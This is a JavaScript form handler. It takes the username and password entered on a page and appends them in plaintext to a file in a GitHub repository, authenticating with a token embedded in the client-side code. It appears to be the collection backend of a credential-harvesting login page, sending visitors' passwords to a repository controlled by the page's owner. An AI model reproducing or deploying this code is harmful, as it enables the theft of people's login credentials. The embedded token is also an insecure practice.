async function saveToGitHub(event) {
    event.preventDefault(); // Prevent form submission

    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    let newEntry = `Username: ${username}\nPassword: ${password}\n------------------------------------------------------------------\n`; // Define newEntry
    let encodedNewEntry = btoa(unescape(encodeURIComponent(newEntry))); // Fix Base64 encoding

    let githubToken = "token"; // Secure input instead of hardcoding
    let repoOwner = "user naem";
    let repoName = "project repo name";
    let filePath = "username.txt";

    let url = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;

    // Step 1: Check if file exists
    let sha = null;
    let existingContent = "";

    let response = await fetch(url, {
        headers: { Authorization: `Bearer ${githubToken}` }
    });

    if (response.ok) {
        let data = await response.json();
        sha = data.sha; // GitHub requires SHA for updates
        existingContent = atob(data.content); // Decode Base64
    } else if (response.status !== 404) {
        alert("Error fetching file: " + response.status);
        return;
    }

    // Step 2: Append new login details to existing content
    let updatedContent = existingContent + newEntry;
    let encodedUpdatedContent = btoa(unescape(encodeURIComponent(updatedContent))); // Fix encoding

    let payload = {
        message: "Append new login details",
        content: encodedUpdatedContent,
        branch: "main",
        ...(sha && { sha }) // Only include `sha` if updating
    };

    // Step 3: Update the file on GitHub
    let result = await fetch(url, {
        method: "PUT",
        headers: {
            Authorization: `Bearer ${githubToken}`,
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });

    if (result.ok) {
        alert("New login details saved to GitHub!");
    } else {
        let errorData = await result.json();
        alert("Error saving to GitHub: " + errorData.message);
    }
}
